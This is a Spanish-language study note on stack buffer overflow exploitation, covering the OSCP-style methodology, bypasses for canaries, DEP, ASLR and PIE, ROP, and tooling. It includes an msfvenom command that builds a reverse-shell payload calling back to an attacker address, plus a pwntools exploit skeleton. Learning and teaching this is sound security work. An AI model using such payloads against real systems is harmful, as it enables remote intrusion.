#reference #Ciberseguridad

**Buffer overflow** = escribir más datos de los que un búfer puede contener, sobrescribiendo memoria adyacente. En el **stack**, sobrescribir la dirección de retorno guardada permite **desviar el flujo de ejecución** → ejecución de código.

![[stack-vs-heap.png]]

# Stack-based overflow — anatomía

```
[ buffer ][ saved EBP/RBP ][ return address ][ args ]
   ^ escribimos aquí ............ hasta sobrescribir el RET
```

Al retornar la función, la CPU salta a la dirección que controlamos.

# Metodología clásica (Windows x86 / OSCP)

| Paso | Acción | Herramienta |
|------|--------|-------------|
| 1. **Fuzzing** | Mandar cadenas crecientes hasta crash. | script Python / boofuzz |
| 2. **Find offset** | Localizar el offset exacto del EIP. | `pattern_create` / `pattern_offset` (msf), mona |
| 3. **Control EIP** | Confirmar que sobrescribimos EIP. | Immunity Debugger / x64dbg |
| 4. **Bad chars** | Detectar bytes que rompen el payload. | `!mona bytearray`, comparación |
| 5. **JMP ESP** | Buscar un gadget fijo que salte al shellcode. | `!mona jmp -r esp` |
| 6. **Shellcode** | Generar payload (revshell). | `msfvenom -b '\x00...'` |

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=443 \
  -f c -b '\x00\x0a\x0d' -e x86/shikata_ga_nai
```

# Protecciones y evasión

| Protección | Qué hace | Evasión |
|------------|----------|---------|
| **Stack canary** | Valor centinela antes del RET; si cambia, aborta. | Leak del canary, o sobrescribir sin tocarlo. |
| **DEP / NX** | Marca el stack como no ejecutable. | **ROP** (ejecutar gadgets existentes). |
| **ASLR** | Aleatoriza direcciones de carga. | Leak de dirección, brute force (32-bit), módulos sin ASLR. |
| **PIE** | Binario reubicable (ASLR del propio binario). | Leak de base. |
| **RELRO** | Protege la GOT. | Atacar otras estructuras. |

## ROP (Return Oriented Programming)

Encadenar *gadgets* (secuencias cortas que terminan en `ret`) ya presentes en el binario/libc para construir la cadena de ejecución sin inyectar código → evade DEP/NX. Sujeto a la arquitectura.

```bash
ROPgadget --binary ./vuln          # listar gadgets
# ret2libc: redirigir a system("/bin/sh") usando libc
```

# Herramientas

| Herramienta | Uso |
|-------------|-----|
| **pwntools** | Framework de explotación en Python. |
| **gdb + pwndbg/GEF** | Debug en Linux. |
| **Immunity Debugger + mona** | Debug en Windows (OSCP). |
| **ROPgadget / ropper** | Buscar gadgets. |
| **angr** | Ejecución simbólica (resolver offsets/inputs). |
| **checksec** | Ver protecciones de un binario. |

```python
from pwn import *
p = process('./vuln')
payload = b'A'*offset + p64(jmp_esp) + shellcode
p.sendline(payload); p.interactive()
```

# Recursos
### [[Binary analysis]] · [[ASM_cheatsheet]]
### [Pentester's guide to BOF (Cobalt)](https://www.cobalt.io/blog/pentester-guide-to-exploiting-buffer-overflow-vulnerabilities)
### [CTF101 — ROP](https://ctf101.org/binary-exploitation/return-oriented-programming/) · [pwn.college](https://pwn.college/) · [angr](https://angr.io/)
